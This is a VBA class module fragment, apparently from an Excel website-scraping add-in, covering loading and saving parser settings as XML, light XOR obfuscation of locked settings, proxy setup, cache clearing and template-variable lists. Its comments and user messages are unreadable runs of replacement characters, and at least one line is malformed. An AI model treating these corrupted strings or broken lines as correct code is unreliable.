            Case vbYes
                If Me.Name = CURRENT_PARSER$ Then CURRENT_PARSER$ "-"
                Kill FileName
            Case vbNo:    ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
        End Select
    End If
End Sub

Function Load(ByVal xmlPath$, Optional ByVal SilentMode As Boolean = True) As Boolean
    On Error Resume Next: Err.Clear
    Dim XML As DOMDocument, msg$, file$, LastUpd$, sLocked$, txt$
    Set XML = CreateObject("Microsoft.XMLDOM")
    
    With XML
        .preserveWhiteSpace = True
        If xmlPath$ Like "*<Parser Name=*>*</Parser>*" Then
            .LoadXML xmlPath$
            Me.FileName = ""
            'SilentMode = True
        Else
            .Load xmlPath$
            Me.FileName = xmlPath$
        End If
        
        Me.Locked = False: sLocked$ = XML.DocumentElement.Attributes.getNamedItem("Locked").text
        If Len(sLocked$) Then If CBool(sLocked$) Then Me.Locked = True
        If Me.Locked Then
            txt = SETT.U(.DocumentElement.SelectSingleNode("Content").text)
            If txt Like "<" & XML_NODE_NAME$ & "*</" & XML_NODE_NAME$ & ">" Then
                .RemoveChild .DocumentElement
                .LoadXML txt
            End If
        End If
        
        With XML.SelectSingleNode(XML_NODE_NAME$)
            
            Me.Name = .Attributes.getNamedItem("Name").text
            If Me.Name = "" Then Me.Name = Replace(Dir(xmlPath$), PARSER_EXT$, "")
            Me.Description = .SelectSingleNode("Description").text
            
            Me.Version = Val(.Attributes.getNamedItem("AppVersion").text)
            If Val(Me.Version) = 0 Then Me.Version = GetVersion        'PARSER_VERSION&
            If Val(Me.Version) > GetVersion Then
                If Not SilentMode Then
                    msg$ = " |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd|" & Me.Name & "|fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd|" & Me.Version & "|fffd|" & vbNewLine & _
                        " (|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)" & vbNewLine & vbNewLine & _
                        " |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|" & vbNewLine & vbNewLine & _
                        "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd|" & Me.Name & "|fffd|?" & vbNewLine & _
                        "(|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|)"
                    If MsgBox(msg, vbExclamation + vbOKCancel + vbDefaultButton2, _
                        "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|") = vbCancel Then Exit Function
                End If
            End If
            
            Me.BuildIn = CBool(Val(.Attributes.getNamedItem("BuildIn").text))
            
            With .SelectSingleNode("Info")
                Me.Description = .Attributes.getNamedItem("Description").text
                Me.AuthorID = .Attributes.getNamedItem("AuthorID").text
                Me.LastEditorID = .Attributes.getNamedItem("LastEditedBy").text
                
                LastUpd$ = .Attributes.getNamedItem("LastUpdate").text
                If IsDate(LastUpd$) Then Me.LastUpdate = CDate(LastUpd$) Else Me.LastUpdate = Now
                
                If .HasChildNodes Then
                    If .LastChild.NodeType = 8 Then        ' NODE_COMMENT = 8
                        Me.DevComment = .LastChild.text
                    End If
                End If
            End With
        End With
        
        LoadContentFromDocumentElement XML.SelectSingleNode(XML_NODE_NAME$)
        
        Load = True: Err.Clear
    End With
End Function

Sub LoadContentFromDocumentElement(ByRef obj As IXMLDOMElement)
    On Error Resume Next
    With obj
        Set Me.Options = New ParserOptions
        Me.Options.LoadFromXML .SelectSingleNode("Options")
        
        Set Me.Downloads = New ParserDownloads
        Set Me.Downloads.Parent = Me
        Me.Downloads.LoadFromXML .SelectSingleNode("Downloads")
        
        Set Me.Columns = New OutputColumns
        Set Me.Columns.Parent = Me
        Me.Columns.LoadFromXML .SelectSingleNode("OutputColumns")
        
        Set Me.SourceData = New ParserSourceData
        Set Me.SourceData.Parent = Me
        Me.SourceData.LoadFromXML .SelectSingleNode("SourceData")
        
        Set Me.AASets = New ActionSets
        Set Me.AASets.Parent = Me
        Me.AASets.LoadFromXML .SelectSingleNode("ActionSets")
        
        Set Me.Macros = New ParserMacros
        Set Me.Macros.Parent = Me
        Me.Macros.LoadFromXML .SelectSingleNode("Macros")
        
        Set Me.Variables = New Variables
        Set Me.Variables.Parent = Me
        Me.Variables.LoadFromXML .SelectSingleNode("Variables")
        
        Set Me.Proxy = New ProxyServers
        Set Me.Proxy.Parent = Me
        Me.Proxy.LoadFromXML .SelectSingleNode("ProxyServers")
        
        Set Me.Protection = New Protection
        Set Me.Protection.Parent = Me
        Me.Protection.LoadFromXML .SelectSingleNode("Protection")
        
        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
        If Me.Options.UseProxy And (Me.Options.ProxyList <> "") Then
            Dim proxy_addr
            Me.Proxy.Enabled = True
            For Each proxy_addr In Split(Me.Options.ProxyList, vbLf)
                Me.Proxy.Add proxy_addr
            Next
            Me.Options.ProxyList = ""
            Me.Options.UseProxy = False
        End If
    End With
End Sub


Function SaveAs(ByVal xmlPath$, Optional AutoSave As Boolean = False) As String
    Dim XML As DOMDocument, rootnode As IXMLDOMElement, dev$, dev_comment$, txt$
    Set XML = CreateObject("Microsoft.XMLDOM")
    
    With XML
        .preserveWhiteSpace = True
        .appendChild .createProcessingInstruction("xml", "version='1.0' encoding='utf-8'")
        
        Set rootnode = .appendChild(XML.createElement(XML_NODE_NAME$))
        With rootnode
            
            .Attributes.setNamedItem(XML.createAttribute("Name")).text = Me.Name
            .Attributes.setNamedItem(XML.createAttribute("AppVersion")).text = GetVersion        'PARSER_VERSION&
            If Me.Locked Then .Attributes.setNamedItem(XML.createAttribute("Locked")).text = Abs(CInt(Me.Locked))
            If Me.BuildIn Then .Attributes.setNamedItem(XML.createAttribute("BuildIn")).text = Abs(CInt(Me.BuildIn))
            
            If Len(Me.Description) Then .appendChild(XML.createElement("Description")).text = Me.Description
            
            With .appendChild(XML.createElement("Info"))
                dev$ = GetSetting(PROJECT_NAME$, "\", "Developer")
                If Me.AuthorID = "" Then Me.AuthorID = IIf(Len(dev$), dev$, HWID)
                .Attributes.setNamedItem(XML.createAttribute("AuthorID")).text = Me.AuthorID
                .Attributes.setNamedItem(XML.createAttribute("LastEditedBy")).text = IIf(Len(dev$), dev$, HWID)
                If Len(xmlPath$) > 0 Then Me.LastUpdate = Now
                .Attributes.setNamedItem(XML.createAttribute("LastUpdate")).text = IIf(Len(xmlPath$) > 0, Me.LastUpdate, CDate(0))
                
                dev_comment$ = Render(GetSetting(PROJECT_NAME$, "\", "Comment"))
                If Len(dev_comment$) = 0 Then dev_comment$ = Me.DevComment
                If Len(dev_comment$) Then .appendChild(XML.createComment("DevComment")).text = dev_comment$
            End With
        End With
        
        SaveContentIntoDocumentElement rootnode
        
        If Me.Locked Then
            txt = SETT.H(rootnode.XML)
            .RemoveChild rootnode
            Set rootnode = .appendChild(XML.createElement(XML_NODE_NAME$))
            With rootnode
                .Attributes.setNamedItem(XML.createAttribute("Name")).text = Me.Name
                .Attributes.setNamedItem(XML.createAttribute("AppVersion")).text = GetVersion        'PARSER_VERSION&
                If Me.Locked Then .Attributes.setNamedItem(XML.createAttribute("Locked")).text = Abs(CInt(Me.Locked))
                If Me.BuildIn Then .Attributes.setNamedItem(XML.createAttribute("BuildIn")).text = Abs(CInt(Me.BuildIn))
                
                
                With .appendChild(XML.createElement("Info"))
                    dev$ = GetSetting(PROJECT_NAME$, "\", "Developer")
                    If Me.AuthorID = "" Then Me.AuthorID = IIf(Len(dev$), dev$, HWID)
                    .Attributes.setNamedItem(XML.createAttribute("AuthorID")).text = Me.AuthorID
                    .Attributes.setNamedItem(XML.createAttribute("LastEditedBy")).text = IIf(Len(dev$), dev$, HWID)
                    If Len(xmlPath$) > 0 Then Me.LastUpdate = Now
                    .Attributes.setNamedItem(XML.createAttribute("LastUpdate")).text = IIf(Len(xmlPath$) > 0, Me.LastUpdate, CDate(0))
                End With
                
                .appendChild(XML.createComment("LockModeComment")).text = "This setting file is protected. Contact developer to unlock."
                .appendChild(XML.createElement("Content")).text = txt
                If Len(dev_comment$) Then .appendChild(XML.createComment("DevComment")).text = dev_comment$
            End With
        End If
        
        If Len(xmlPath$) > 0 Then
            .Save xmlPath$
            
            If Not AutoSave Then
                ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
                On Error Resume Next: Dim parser_settings_temp_filename$
                parser_settings_temp_filename$ = SETTINGS_BACKUP_FOLDER$ & "parser_backup_" & Format(Now, "YYYY-MM-DD--HH-NN-SS") & "_" & FWF.Replace_symbols(Me.Name) & ".xlp"
                FileCopy xmlPath$, parser_settings_temp_filename$
                Err.Clear
            End If
        End If
        
        SaveAs = .XML
    End With
End Function

Function Saved() As Boolean
    On Error Resume Next
    If Me.IsBuiltIn Then Saved = True: Exit Function
    
    Dim tempWP As New WebsiteParser: tempWP.Load Me.FileName
    Saved = tempWP.SaveAs("") = Me.SaveAs("")
    ' FWF.ShowText tempWP.SaveAs(""), 1
    ' FWF.ShowText Me.SaveAs(""), 2
    Set tempWP = Nothing
End Function

Sub SaveContentIntoDocumentElement(ByRef obj As IXMLDOMElement)
    On Error Resume Next
    Dim BlankWP As New WebsiteParser    ' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    With obj
        If Me.Proxy.ExportToXML.XML <> BlankWP.Proxy.ExportToXML.XML Then .appendChild Me.Proxy.ExportToXML
        If Me.Options.ExportToXML.XML <> BlankWP.Options.ExportToXML.XML Then .appendChild Me.Options.ExportToXML
        If Me.SourceData.ExportToXML.XML <> BlankWP.SourceData.ExportToXML.XML Then .appendChild Me.SourceData.ExportToXML
        If Me.Columns.ExportToXML.XML <> BlankWP.Columns.ExportToXML.XML Then .appendChild Me.Columns.ExportToXML
        If Me.Downloads.ExportToXML.XML <> BlankWP.Downloads.ExportToXML.XML Then .appendChild Me.Downloads.ExportToXML
        If Me.Locked Then If Me.Protection.ExportToXML.XML <> BlankWP.Protection.ExportToXML.XML Then .appendChild Me.Protection.ExportToXML
        
        If Me.AASets.Items.Count Then .appendChild Me.AASets.ExportToXML
        If Me.Macros.Items.Count Then .appendChild Me.Macros.ExportToXML
        If Me.Variables.Items.Count Then .appendChild Me.Variables.ExportToXML
    End With
    Set BlankWP = Nothing
End Sub

Sub Save(Optional AutoSave As Boolean = False)
    If Me.IsBuiltIn Then
        Me.AttachToSheet Me.ParentSheet
    Else
        If Len(Me.FileName) Then
            Me.SaveAs Me.FileName, AutoSave
        Else
            MsgBox "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|", vbExclamation, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
            Exit Sub
        End If
    End If
End Sub

Function GetCacheFolderPath() As String
    On Error Resume Next: Dim FolderName$
    FolderName$ = Me.Name
    If Me.Options.AnotherCache Then If Me.Options.AnotherCacheName <> "" Then FolderName$ = Me.Options.AnotherCacheName
    
    GetCacheFolderPath = CACHE_FOLDER$ & IIf(Len(FolderName$), FWF.Replace_symbols(FolderName$), "unnamed") & "\"
    If Not FolderExists(GetCacheFolderPath) Then SHCreateDirectoryEx Application.Hwnd, GetCacheFolderPath, ByVal 0&        ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|
End Function

Sub ClearCacheFolder()
    On Error Resume Next
    Kill Me.GetCacheFolderPath & "HTML*=*.txt"
    Kill Me.GetCacheFolderPath & "IE*=*.txt"
    Kill Me.GetCacheFolderPath & "POST*=*.txt"
    Kill Me.GetCacheFolderPath & "PDF*=*.txt"
End Sub

Function AttachToSheet(ByRef shd As Worksheet) As Boolean
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| WB
    On Error Resume Next
    Dim WB As Workbook: Set WB = shd.Parent
    Application.ScreenUpdating = False
    
    Dim BI As Boolean: BI = Me.BuildIn: Me.BuildIn = True
    SaveTextWithSheet shd, PARSER_DATA_NAME$, ParserEncrypt$
    Me.BuildIn = BI        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    
    Dim sh As Worksheet, shs As Worksheet, sha As Shape, ButtonName$
    For Each sh In WB.Worksheets
        If sh.Codename Like "shm*" Then Application.DisplayAlerts = False: sh.Visible = xlSheetVisible: sh.Delete: Application.DisplayAlerts = True
    Next sh
    shm.Copy WB.Worksheets(WB.Worksheets.Count)
    WB.Worksheets(shm.Name).Visible = xlSheetVeryHidden
    
    Err.Clear: Set shs = WB.Worksheets(shm.Name)
    If Err Then MsgBox "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|", vbCritical
    For Each sha In shs.Shapes
        ButtonName$ = sha.Name
        If Not IsObject(shd.Shapes(ButtonName$)) Then
            sha.Copy
            shd.Paste
            With shd.Shapes(ButtonName$)
                .Top = sha.Top
                .Left = sha.Left
                .OnAction = "'" & WB.Name & "'!shm." & Split(.OnAction, "shm.")(1)
            End With
        End If
    Next
    shs.DrawingObjects.Delete
    
    shd.Activate
    shd.Cells(1).Select
    Application.ScreenUpdating = True
End Function

Private Function ParserEncrypt$()
    On Error Resume Next: Randomize Second(Now)
    Dim d&, i&, r&, txt$
    txt$ = Me.SaveAs("")
    d = Fix(98 * Rnd() + 1): ParserEncrypt$ = IIf(Len(Hex(d)) = 1, "0", "") & Hex(d)
    For i = 1 To Len(txt)
        r = Asc(Mid(txt, i, 1)) Xor CInt(2 * d * Abs(Sin(3 * i))) + Val(Mid(PARSER_ENCRYPT_KEY$, 2 + i Mod 10, 1))
        ParserEncrypt$ = ParserEncrypt$ & IIf(Len(Hex(r)) = 1, "0", "") & Hex(r)
    Next
End Function

Function GetVariablesNamesList(Optional ByVal TwoColumns As Boolean = False, _
        Optional ByRef CurrentActions As ArrayActions, Optional FormCaption$) As Variant
    On Error Resume Next
    Dim coll As New Collection, obj As Object, i&, key, ParserEditor As Boolean
    ParserEditor = FormCaption$ = "Parser Edit Form"
    
    Me.ReadOptionsFromINI
    Me.Variables.Initialize
    
    If Me.Options.CaptchaEnabled Then
        If FormCaption$ Like "*|fffd|" & Me.Options.CaptchaHandler & "|fffd|*" Then coll.Add CAPTCHA_URL_VAR_NAME$, CAPTCHA_URL_VAR_NAME$
    End If
    
    For Each key In ParserVariables.Keys
        If key Like "%*%" Then key = Split(key, "%")(1): coll.Add CStr(key), CStr(key)
    Next
    
    If Not CurrentActions Is Nothing Then CurrentActions.GetAllVariablesNames coll
    
    Me.SourceData.Actions.GetAllVariablesNames coll
    Me.Columns.Actions.GetAllVariablesNames coll
    Me.Downloads.Actions.GetAllVariablesNames coll
    
    For Each obj In Me.AASets.Items
        obj.Actions.GetAllVariablesNames coll
    Next obj
    For Each obj In Me.Columns.Items
        obj.Actions.GetAllVariablesNames coll
    Next
    For Each obj In Me.Downloads.Items
        obj.Actions.GetAllVariablesNames coll
    Next
    
    coll.Remove ""
    SortCollection coll
    
    If TwoColumns Then
        If (Not CurrentActions Is Nothing) Then      ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
            coll.Remove "%WebsiteURL%"
            ReDim arr(1 To coll.Count + 25, 1 To 2)
            For i = 1 To coll.Count
                arr(i, 1) = "%" & coll(i) & "%"
                If coll(i) = CAPTCHA_URL_VAR_NAME$ Then
                    arr(i, 2) = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| URL |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & arr(i, 1)
                Else
                    arr(i, 2) = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|  " & coll(i)
                End If
            Next i
            i = coll.Count + 1
            i = i + 1: arr(i, 1) = "{NL}": arr(i, 2) = "{NL} - |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| (13+10)"
            i = i + 1: arr(i, 1) = "{LF}": arr(i, 2) = "{LF} - |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| (10)"
            i = i + 1: arr(i, 1) = "{TAB}": arr(i, 2) = "{TAB} - |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
            
            i = i + 1: arr(i, 1) = "{1}": arr(i, 2) = "{1} - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|"
            i = i + 1: arr(i, 1) = "{1!}": arr(i, 2) = "{1!} - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|"
            i = i + 1: arr(i, 1) = "{1@}": arr(i, 2) = "{1@} - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|"
            i = i + 1: arr(i, 1) = "{1!}": arr(i, 2) = "{1@!} - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|"
            i = i + 1: arr(i, 1) = "{$1}": arr(i, 2) = "{$1} - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
            i = i + 1: arr(i, 1) = "{$1@}": arr(i, 2) = "{$1@} - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
            i = i + 1: arr(i, 1) = "{=B2}": arr(i, 2) = "{=B2} - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|)"
            i = i + 1: arr(i, 1) = "{row}": arr(i, 2) = "{row} - |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"
            i = i + 1: arr(i, 1) = "{ColumnName}": arr(i, 2) = "{ColumnName} - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
            i = i + 1: arr(i, 1) = "{ParserName}": arr(i, 2) = "{ParserName} - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
            
            i = i + 1: arr(i, 1) = "{time=DD.MM.YYYY hh-nn-ss}": arr(i, 2) = "{time=DD.MM.YYYY hh-nn-ss} - |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|+|fffd||fffd||fffd||fffd||fffd|"
            i = i + 1: arr(i, 1) = "{time-1=DD.MM.YYYY}": arr(i, 2) = "{time-1=DD.MM.YYYY} - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|"
            
            i = i + 1: arr(i, 1) = "{item_index}": arr(i, 2) = "{item_index} - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
            i = i + 1: arr(i, 1) = "{value_index}": arr(i, 2) = "{value_index} - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
            i = i + 1: arr(i, 1) = "{value}": arr(i, 2) = "{value} - |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
            i = i + 1: arr(i, 1) = "$$index": arr(i, 2) = "$$index - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
            i = i + 1: arr(i, 1) = "$$count": arr(i, 2) = "$$count - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
            i = i + 1: arr(i, 1) = "%WebsiteURL%": arr(i, 2) = "%WebsiteURL% - URL |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|"
            i = i + 1: arr(i, 1) = "%LastUsedURL%": arr(i, 2) = "%LastUsedURL% - URL |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|. |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
            
            i = i + 2: arr(i, 1) = "help": arr(i, 2) = ChrW(10033) & ChrW(10033) & "  |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|  " & ChrW(10033) & ChrW(10033)
            
        ElseIf ParserEditor Then        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
            coll.Remove "%WebsiteURL%"
            ReDim arr(1 To coll.Count + 5, 1 To 2)
            For i = 1 To coll.Count
                arr(i, 1) = "%" & coll(i) & "%"
                arr(i, 2) = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|  " & coll(i)
            Next i
            i = coll.Count + 1
            i = i + 1: arr(i, 1) = "{ParserName}": arr(i, 2) = "{ParserName} - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
            i = i + 1: arr(i, 1) = "{time=DD.MM.YYYY}": arr(i, 2) = "{time=DD.MM.YYYY} - |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|"
            i = i + 1: arr(i, 1) = "{time=DD.MM.YYYY hh-nn-ss}": arr(i, 2) = "{time=DD.MM.YYYY hh-nn-ss} - |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|+|fffd||fffd||fffd||fffd||fffd|"
            i = i + 1: arr(i, 1) = "{time-1=DD.MM.YYYY}": arr(i, 2) = "{time-1=DD.MM.YYYY} - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|"
            
        Else        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
            ReDim arr(1 To coll.Count, 1 To 2)
            For i = 1 To coll.Count
                arr(i, 1) = "%" & coll(i) & "%"
                arr(i, 2) = "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|  " & coll(i)
            Next i
        End If
    Else
        ReDim arr(1 To coll.Count, 1 To 1)
        For i = 1 To coll.Count
            arr(i, 1) = coll(i)
        Next i
    End If
    GetVariablesNamesList = arr
End Function

Sub WaitAPause(Optional ByVal interval As Double)
    On Error Resume Next
    Dim RequestNextTime As Long, t As Double, Pause As Double, line2$, line3$, PI_arr, Percent As Single
    Pause = Me.Options.Pause
    If interval > 0 And interval < 10000 Then Pause = interval
    If Pause Then
        RequestNextTime = RequestLastTime + Pause * 1000&
        'PI_arr = Me.PrInd1.ResetSettings
        If GetTickCount < 0 Then If RequestLastTime >= 0 Then RequestNextTime = GetTickCount - 1
        
        While RequestNextTime > GetTickCount
            Percent = 1 - (RequestNextTime - GetTickCount) / 1000 / Pause
            Me.PrInd1.ShowMessage tt("PI_ShowMessage_WaitAPause", Format(Pause - (RequestNextTime - GetTickCount) / 1000, "0.0") & " / " & Round(Pause, 1)) & _
                GetUnicodeProgressLine(Percent, 40)
            'Me.PrInd1.line2 = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| (" & Round(Pause, 1) & " |fffd||fffd||fffd|.) |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|..."
            'Me.PrInd1.line3 = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|: " & Format((RequestNextTime - GetTickCount) / 1000, "0.0") & " |fffd||fffd||fffd|."
            t = Timer: While Abs(Timer - t) < 0.1: DoEvents: Wend
            If StopMacro Then Exit Sub
        Wend
        'Me.PrInd1.RestoreSettings PI_arr
        Me.PrInd1.HideMessages 3
    End If
    RequestLastTime = GetTickCount
End Sub

Function GetHTMLdescription()
